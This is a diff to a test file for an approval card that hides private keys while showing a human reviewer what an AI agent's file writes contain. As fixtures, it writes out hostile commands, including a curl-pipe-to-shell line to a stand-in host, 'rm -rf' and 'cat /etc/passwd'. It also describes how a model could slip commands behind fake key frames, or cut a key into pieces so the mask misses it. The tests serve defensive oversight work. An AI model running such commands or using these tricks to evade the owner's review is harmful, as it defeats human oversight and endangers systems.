@@ -25,6 +25,7 @@ import { PermissionGate } from '../lib/permissions.mjs';
 import { HookRunner } from '../lib/hooks.mjs';
 import { PREVIEW_LIMITS, argumentsDigest, buildChangePreview, hideKeyBlocks, hideKeyMaterial, holdsPrivateKey, keyLines, looksLikeKey, privateKeyBodyLines } from '../lib/approval-preview.mjs';
 import { diffHunks, hunksDigest } from '../lib/line-diff.mjs';
+import { HIDEABLE_WORDS, KEY_BODY, LAST_LINE, RUN_EDGES, keyShapes, piecesIn, BEGIN as KEY_BEGIN, END as KEY_END } from './support/key-shapes.mjs';
 
 let checks = 0;
 const ok = (label) => { checks += 1; console.log(`  ok - ${label}`); };
@@ -393,7 +394,12 @@ const rowsOf = (file) => file.hunks.flatMap((hunk) => hunk.rows);
   // hideKeyBlocks: the key goes, the frames and the rest of the line stay; what is not a key stays
   assert.equal(hideKeyBlocks(`a ${FRAMES[0]}${K[0]}${FRAMES[1]} b\n`), `a ${FRAMES[0]}[REDACTED]${FRAMES[1]} b\n`, 'one key in a row');
   assert.equal(hideKeyBlocks(`${FRAMES[0]}${K[0]}${FRAMES[1]} and ${FRAMES[0]}${K[1]}${FRAMES[1]}`), `${FRAMES[0]}[REDACTED]${FRAMES[1]} and ${FRAMES[0]}[REDACTED]${FRAMES[1]}`, 'two keys in a row');
-  assert.equal(hideKeyBlocks(`${FRAMES[0]}${K[0]}${FRAMES[0]}${K[1]}${FRAMES[1]}`), `${FRAMES[0]}${K[0]}${FRAMES[0]}${K[1]}${FRAMES[1]}`, 'a BEGIN frame inside a key in one row: what lies between the frames holds a frame, so it is not a key, and stays');
+  {
+    // a BEGIN frame inside a key in one row: the base64 on both sides of it is hidden where it stands (the dashes of the frame that touch it go with it), the outer frames stay
+    const nested = hideKeyBlocks(`${FRAMES[0]}${K[0]}${FRAMES[0]}${K[1]}${FRAMES[1]}`);
+    assert.ok(nested.startsWith(FRAMES[0]) && nested.endsWith(FRAMES[1]) && nested.includes('[REDACTED]'), 'the outer frames stay and something is hidden');
+    assert.deepEqual([K[0], K[1]].filter((line) => nested.includes(line)), [], 'and no line of the key is left');
+  }
   assert.equal(hideKeyBlocks(`${FRAMES[0]}${K[0]}${FRAMES[1]} then ${FRAMES[0]} and no end`), `${FRAMES[0]}[REDACTED]${FRAMES[1]} then ${FRAMES[0]} and no end`, 'a BEGIN with no END after it hides nothing (the lines that follow are its body, by place)');
   assert.equal(hideKeyBlocks(`${FRAMES[1]}${FRAMES[0]}`), `${FRAMES[1]}${FRAMES[0]}`);
   // a text is read by itself: the key after a BEGIN frame that has no END in the text, and the key before an END frame that has no BEGIN, are the start and the end of a body that goes on beyond the
@@ -416,8 +422,8 @@ const rowsOf = (file) => file.hunks.flatMap((hunk) => hunk.rows);
   assert.equal(holdsPrivateKey(`${FRAMES[0]}\n${K[0]}\n${FRAMES[1]}\n`), true, 'so is a block');
   assert.equal(holdsPrivateKey(`${FRAMES[0]}\n${FRAMES[1]}\n`), false, 'frames with nothing between them are not');
   assert.equal(holdsPrivateKey(`${FRAMES[0]}\n${EVIL}\n${FRAMES[1]}\n`), false, 'frames with code between them are not');
-  assert.equal(holdsPrivateKey(`${FRAMES[0]}\n${K[0]} ${K[1]}\n${FRAMES[1]}\n`), false, 'nor with a line of two tokens: a line of a body is one');
-  assert.equal(holdsPrivateKey(`# ${FRAMES[0]}\nrm -rf /var/lib/app\nreboot\nRestart-Computer -Force\n${FRAMES[1]}\n`), false, 'nor with commands');
+  assert.equal(holdsPrivateKey(`${FRAMES[0]}\n${K[0]} ${K[1]}\n${FRAMES[1]}\n`), true, 'a line of a body with two runs of base64 in it holds key material: each run is hidden where it stands');
+  assert.equal(holdsPrivateKey(`# ${FRAMES[0]}\nrm -rf /var/lib/app\nreboot\nStop-Service nginx\n${FRAMES[1]}\n`), false, 'nor with commands (none has a run of 16 characters)');
   assert.equal(holdsPrivateKey('-----BEGIN PUBLIC KEY-----\nabc\n-----END PUBLIC KEY-----\n'), false, 'a public key is not');
   assert.equal(holdsPrivateKey('nothing of the kind'), false);
   // a block over several lines keeps its frames on lines of their own, whether the masker or the card reads it; the lines that are not a key stay where they are
@@ -427,7 +433,7 @@ const rowsOf = (file) => file.hunks.flatMap((hunk) => hunk.rows);
   assert.equal(hideKeyBlocks(`${FRAMES[0]}\n${K[0]}\n${EVIL}\n${K[1]}\n${FRAMES[1]}`), `${FRAMES[0]}\n[REDACTED]\n${EVIL}\n[REDACTED]\n${FRAMES[1]}`, 'code among the lines of a key stays, and the lines around it go');
   assert.equal(hideKeyBlocks(`${FRAMES[0]}\n${K[0]}\n${K[1]}${FRAMES[1]}`), `${FRAMES[0]}\n[REDACTED]\n[REDACTED]${FRAMES[1]}`, 'the text before an END frame is the rest of a line of its own: it is hidden on that line, not merged with the lines above');
   assert.equal(hideKeyBlocks(`${FRAMES[0]}${K[0]}\n${K[1]}\n${FRAMES[1]}`), `${FRAMES[0]}[REDACTED]\n[REDACTED]\n${FRAMES[1]}`, 'and the text after a BEGIN frame');
-  assert.equal(hideKeyBlocks(`${FRAMES[0]}\n${K[0]} ${K[1]}\n${FRAMES[1]}`), `${FRAMES[0]}\n${K[0]} ${K[1]}\n${FRAMES[1]}`, 'a line of two tokens is not a line of a key');
+  assert.equal(hideKeyBlocks(`${FRAMES[0]}\n${K[0]} ${K[1]}\n${FRAMES[1]}`), `${FRAMES[0]}\n[REDACTED] [REDACTED]\n${FRAMES[1]}`, 'a line of two tokens is not hidden whole, but each run of base64 in it is hidden where it stands');
   assert.equal(hideKeyBlocks(`${FRAMES[0]}${K[0]} ${K[1]}\n${K[2]}\n${FRAMES[1]}`), `${FRAMES[0]}[REDACTED]\n[REDACTED]\n${FRAMES[1]}`, 'but the rest of the line of a frame is a part of a row: several tokens are a key written on one line');
   assert.equal(hideKeyBlocks(`${FRAMES[0]}\n${EVIL}\n${FRAMES[1]}`), `${FRAMES[0]}\n${EVIL}\n${FRAMES[1]}`, 'a fake key hides nothing');
   assert.equal(hideKeyBlocks(`${FRAMES[0]}\n${K[0]}\n${FRAMES[0]}\n${K[1]}\n${FRAMES[1]}`), `${FRAMES[0]}\n[REDACTED]\n${FRAMES[0]}\n[REDACTED]\n${FRAMES[1]}`, 'a BEGIN frame on a line of its own inside a key stays, and the lines around it go');
@@ -445,7 +451,7 @@ const rowsOf = (file) => file.hunks.flatMap((hunk) => hunk.rows);
   assert.equal(hideKeyMaterial(`${B}${FRAMES[1]}\r\n`, true), `[REDACTED]${FRAMES[1]}\r\n`);
   assert.equal(hideKeyMaterial(`${A}${FRAMES[1]} and ${FRAMES[0]}${B}\n`, true), `[REDACTED]${FRAMES[1]} and ${FRAMES[0]}[REDACTED]\n`, 'a line that ends one key and begins another');
   assert.equal(hideKeyMaterial(`${FRAMES[0]}${A}${FRAMES[1]}\n`, false), `${FRAMES[0]}[REDACTED]${FRAMES[1]}\n`, 'a key that begins and ends in the line');
-  assert.equal(hideKeyMaterial(`aa ${FRAMES[0]}${A} ${FRAMES[0]} ${B}\n`, false), `aa ${FRAMES[0]}${A} ${FRAMES[0]} ${B}\n`, 'with two BEGIN frames the body starts at the FIRST, and a frame inside it makes it something other than a key: it stays');
+  assert.equal(hideKeyMaterial(`aa ${FRAMES[0]}${A} ${FRAMES[0]} ${B}\n`, false), `aa ${FRAMES[0]}[REDACTED] ${FRAMES[0]} [REDACTED]\n`, 'with two BEGIN frames the body starts at the FIRST; the text after it is not all base64 (a frame is in it), so its runs of base64 are hidden where they stand and the frame stays');
   assert.equal(hideKeyMaterial(`${A} ${FRAMES[1]} bb ${FRAMES[1]} cc\n`, true), `[REDACTED]${FRAMES[1]} bb ${FRAMES[1]} cc\n`, 'a body that is open ends at the FIRST END frame');
   assert.equal(hideKeyMaterial('a line with no frame', false), 'a line with no frame');
   assert.equal(hideKeyMaterial(`before ${FRAMES[1]} after\n`, false), `before ${FRAMES[1]} after\n`, 'an END frame with no body open: the text before it is not a body');
@@ -606,12 +612,12 @@ const rowsOf = (file) => file.hunks.flatMap((hunk) => hunk.rows);
       assert.notEqual(fake.request.detail.hidden, true, `${label}: the words of the model are not left out of the card either`);
       assert.equal(showsEvil(fake.request.detail), true, `${label}: they are in the details of the request`);
     }
-    // a line of a body that is two tokens is not a line of a key (a key line is one token); a short word between key lines stays
+    // a line of a body that is two tokens of base64 is not hidden whole (a key line is one token), but each run in it is hidden where it stands; a short word between key lines stays
     const twoTokens = await ask(newGate(), 'local.write_file', { path: 'fake/two-tokens.txt', content: `${FRAMES[0]}\n${K[0]} ${K[1]}\nhello\n${FRAMES[1]}\n` });
-    assert.deepEqual(rowsOf(twoTokens.request.detail.preview.files[0]).map((row) => row.text), [`${FRAMES[0]}\n`, `${K[0]} ${K[1]}\n`, 'hello\n', `${FRAMES[1]}\n`], 'a line of two tokens and a short word stay on the card');
-    assert.equal(twoTokens.request.detail.preview.files[0].hiddenKeyRows, undefined);
+    assert.deepEqual(rowsOf(twoTokens.request.detail.preview.files[0]).map((row) => row.text), [`${FRAMES[0]}\n`, '[REDACTED] [REDACTED]\n', 'hello\n', `${FRAMES[1]}\n`], 'a line of two tokens has its two runs hidden where they stand, and a short word stays on the card');
+    assert.equal(twoTokens.request.detail.preview.files[0].hiddenKeyRows, 1);
     // commands that are plain words stay as well (a script with a BEGIN frame in a comment)
-    const COMMANDS = ['rm -rf /var/lib/app', 'reboot', 'Restart-Computer -Force', 'sudo shutdown', 'cat /etc/passwd', 'halt', 'whoami'];
+    const COMMANDS = ['rm -rf /var/lib/app', 'reboot', 'Stop-Service nginx', 'sudo shutdown', 'cat /etc/passwd', 'halt', 'whoami'];
     const script = await ask(newGate(), 'local.write_file', { path: 'fake/x.sh', content: `# ${FRAMES[0]}\n${COMMANDS.join('\n')}\n${FRAMES[1]}\n` });
     const scriptRows = rowsOf(script.request.detail.preview.files[0]).map((row) => row.text);
     assert.deepEqual(COMMANDS.filter((line) => !scriptRows.includes(`${line}\n`)), [], 'every command between the two frames is on the card');
@@ -661,6 +667,79 @@ const rowsOf = (file) => file.hunks.flatMap((hunk) => hunk.rows);
     assert.equal(long.request.detail.preview.files[0].hiddenKeyRows, undefined, 'the key is below them: no row of it is on the card, so none is counted');
     assert.equal(long.request.detail.preview.privateKeys, true, 'the call still touches a key');
     ok(`${SHAPES.length} shapes of a key in code and configuration (a block, strings joined with +, a JSON array, a YAML block and list, # and // comments, a here document, a Python list, a PGP block), with Unix and Windows line endings: the key is hidden whole and counted, the frames and the words around it stay`);
+
+    // The fourth audit: a real key written the way people write it in scripts and code (a prefix like `-- ` or `REM `, `echo "..." >> key` around it, b"...\n", a PowerShell backtick-n between the
+    // lines of a one-line key ...) showed its whole body on the card in 23 of 31 shapes, because a row was hidden only when it was ONE token after a short list of quotes and commas was taken
+    // off it. A list of decorations is never complete, so what is hidden now is every run of 16 characters or more of base64 in a body, wherever it stands; the decoration stays where it is.
+    {
+      const shapes = keyShapes();
+      assert.equal(shapes.length, 31);
+      let shapeCount = 0;
+      for (const { name, content } of shapes) {
+        shapeCount += 1;
+        const shaped = await ask(newGate(), 'local.write_file', { path: `audit3/shape-${shapeCount}.txt`, content });
+        const request = shaped.request;
+        assert.deepEqual(piecesIn([request, shaped.events]), [], `${name}: no line of the key is anywhere (the card, the events)`);
+        assert.equal(request.detail.preview.privateKeys, true, `${name}: the call says that it touches a key`);
+        assert.ok(request.detail.preview.files[0].hiddenKeyRows >= 1, `${name}: and the card counts the rows that it hid`);
+      }
+      // what stays where it was: the decoration, the frames and the code around the key; and what the card says is hidden is only a run of base64
+      const echo = await ask(newGate(), 'local.write_file', { path: 'audit3/echo.sh', content: shapes.find((shape) => shape.name.includes('echo per line')).content });
+      const echoRows = rowsOf(echo.request.detail.preview.files[0]).map((row) => row.text);
+      assert.deepEqual(echoRows.slice(1, 5), Array.from({ length: 4 }, () => 'echo "[REDACTED]" >> /root/key\n'), 'an echo per line: the line goes, the command around it stays');
+      assert.equal(echoRows[5], `echo "${LAST_LINE}" >> /root/key\n`, 'the last line of the key is shorter than 16 characters and decorated: it shows (the edge that the docs name)');
+      assert.ok(echo.request.detail.preview.files[0].hiddenKeyRows >= 4, 'the four long lines are counted');
+      const dashes = await ask(newGate(), 'local.write_file', { path: 'audit3/sql.sql', content: shapes.find((shape) => shape.name.includes('"-- " prefix')).content });
+      const dashRows = rowsOf(dashes.request.detail.preview.files[0]).map((row) => row.text);
+      assert.deepEqual(dashRows.slice(1, 5), Array.from({ length: 4 }, () => '-- [REDACTED]\n'), 'a prefix of a comment stays, every long line of the key goes');
+      assert.equal(dashRows[5], `-- ${LAST_LINE}\n`, 'the last line has a prefix and is shorter than 16 characters: it shows (the edge that the docs name)');
+      const bytes = await ask(newGate(), 'local.write_file', { path: 'audit3/bytes.py', content: shapes.find((shape) => shape.name.includes('bytes b"...\\n"')).content });
+      assert.deepEqual(rowsOf(bytes.request.detail.preview.files[0]).map((row) => row.text).slice(2, 6), Array.from({ length: 4 }, () => '    b"[REDACTED]\\n"\n'), 'b"...\\n": the b, the quotes and the \\n stay');
+      const backtick = await ask(newGate(), 'local.write_file', { path: 'audit3/key.ps1', content: shapes.find((shape) => shape.name.includes('backtick-n')).content });
+      const backtickRow = rowsOf(backtick.request.detail.preview.files[0])[0].text;
+      assert.ok(backtickRow.startsWith(`$k = "${KEY_BEGIN}`) && backtickRow.endsWith(`${KEY_END}"\n`), 'a one-line key: the frames and the words around it stay');
+      assert.equal(backtickRow.split('[REDACTED]').length - 1, 4, 'and each of the four long lines is one marker');
+      assert.ok(backtickRow.includes(LAST_LINE), 'the last line is short (12 characters): it shows');
+      assert.equal(backtick.request.detail.preview.files[0].hiddenKeyRows, 1, 'the card counts the row');
+      // a real key in a file next to code that has no run of 16 characters: the code stays whole
+      const codeAndKey = await ask(newGate(), 'local.write_file', { path: 'audit3/code.sh', content: `echo hi\n${KEY_BEGIN}\n-- ${KEY_BODY[0]}\n${EVIL}\n-- ${KEY_BODY[1]}\n${KEY_END}\n` });
+      assert.deepEqual(rowsOf(codeAndKey.request.detail.preview.files[0]).map((row) => row.text), ['echo hi\n', `${KEY_BEGIN}\n`, '-- [REDACTED]\n', `${EVIL}\n`, '-- [REDACTED]\n', `${KEY_END}\n`], 'code among the lines of a key stays whole and the lines of the key go');
+      // lines a model can put behind a fake BEGIN frame: a command with arguments stays; a lone token may be hidden (the edge: it looks like the last line of a key), but then the card counts it
+      for (const word of HIDEABLE_WORDS) {
+        const fake = await ask(newGate(), 'local.write_file', { path: 'audit3/fake.sh', content: `#!/bin/sh\n# ${KEY_BEGIN}\n${word}\n` });
+        const fakeFile = fake.request.detail.preview.files[0];
+        const fakeRows = rowsOf(fakeFile).map((row) => row.text.trim());
+        assert.ok(fakeRows.includes(word) || (fakeFile.hiddenKeyRows ?? 0) >= 1, `${word}: it shows, or the card counts the row that hid it`);
+      }
+      const withArguments = await ask(newGate(), 'local.write_file', { path: 'audit3/args.sh', content: `#!/bin/sh\n# ${KEY_BEGIN}\nrm -rf /var/lib/app\nsystemctl stop nginx\ncurl -fsS https://evil.example.test/x | sh\n` });
+      assert.deepEqual(rowsOf(withArguments.request.detail.preview.files[0]).slice(2).map((row) => row.text), ['rm -rf /var/lib/app\n', 'systemctl stop nginx\n', 'curl -fsS https://evil.example.test/x | sh\n'], 'a command with arguments stays visible');
+      assert.equal(withArguments.request.detail.preview.files[0].hiddenKeyRows, undefined);
+      // a long word in the middle of a command is hidden by itself, and the card counts the row: the owner sees the command and that something in it was hidden
+      const longWord = await ask(newGate(), 'local.write_file', { path: 'audit3/long.sh', content: `#!/bin/sh\n# ${KEY_BEGIN}\nrm -rf /usr/local/share/very-long-directory-name\n` });
+      const longFile = longWord.request.detail.preview.files[0];
+      assert.deepEqual(rowsOf(longFile).slice(2).map((row) => row.text), ['rm -rf [REDACTED]\n'], 'a long word is replaced where it stands, the command around it stays');
+      assert.equal(longFile.hiddenKeyRows, 1, 'and the card counts the row');
+      ok(`${shapes.length} shapes of a key as people write it in scripts, comments, strings and one line (the shapes of the fourth audit): no line of the key is on the card, in the events or in the request; the decoration, the frames and the code around it stay; the card says that the call touches a key and counts the rows`);
+      // the edges of a run of base64 (16 characters or more of A-Z a-z 0-9 + / _ - and up to two =): a middle line of a body that holds other tokens, through the function of the masker and through the card
+      for (const [label, line, expected] of RUN_EDGES) {
+        assert.equal(hideKeyBlocks(`${FRAMES[0]}\n${line}\n${FRAMES[1]}`), `${FRAMES[0]}\n${expected}\n${FRAMES[1]}`, `hideKeyBlocks: ${label}`);
+      }
+      const edges = await ask(newGate(), 'local.write_file', { path: 'audit3/run-edges.txt', content: `${KEY_BEGIN}\n${RUN_EDGES.map(([, line]) => line).join('\n')}\n${KEY_END}\n` });
+      const edgeFile = edges.request.detail.preview.files[0];
+      assert.deepEqual(rowsOf(edgeFile).map((row) => row.text), [`${KEY_BEGIN}\n`, ...RUN_EDGES.map(([, , expected]) => `${expected}\n`), `${KEY_END}\n`], 'the card hides the same runs in the same lines and nothing else');
+      assert.equal(edgeFile.hiddenKeyRows, RUN_EDGES.filter(([, line, expected]) => line !== expected).length, 'and counts the rows that changed');
+      ok(`${RUN_EDGES.length} edges of a run of base64 (15, 16 and 17 characters, each character of the alphabet, the = after it, a dot and a colon that are none), through hideKeyBlocks and through the card`);
+      // the edge that the docs name: a key cut into pieces of eight characters has no run of 16, so it shows (a model that works at getting round the mask can; the common ways of writing a key cannot)
+      const cut = KEY_BODY[0].match(/.{8}/g).join(' ');
+      const cutKey = await ask(newGate(), 'local.write_file', { path: 'audit3/cut.txt', content: `${KEY_BEGIN}\n${cut}\n${KEY_END}\n` });
+      assert.deepEqual(rowsOf(cutKey.request.detail.preview.files[0]).map((row) => row.text), [`${KEY_BEGIN}\n`, `${cut}\n`, `${KEY_END}\n`], 'a key cut into pieces of eight characters shows (the documented edge)');
+      // a row that is hidden whole keeps the line ending it had (Windows, Unix, and a carriage return alone), and the rows next to it are not merged
+      for (const [label, eol] of [['Windows', '\r\n'], ['Unix', '\n']]) {
+        const endings = await ask(newGate(), 'local.write_file', { path: `audit3/ending-${label}.txt`, content: [KEY_BEGIN, KEY_BODY[0], KEY_BODY[1], KEY_END, ''].join(eol) });
+        assert.deepEqual(rowsOf(endings.request.detail.preview.files[0]).map((row) => row.text), [`${KEY_BEGIN}${eol}`, `[REDACTED]${eol}`, `[REDACTED]${eol}`, `${KEY_END}${eol}`], `${label} line endings: each hidden row keeps its own`);
+      }
+      ok('a row that is hidden whole keeps its line ending, Windows or Unix, and each row stays a row of its own');
+    }
   }
 
   // a protected file: asked with nothing to show, and the content is nowhere
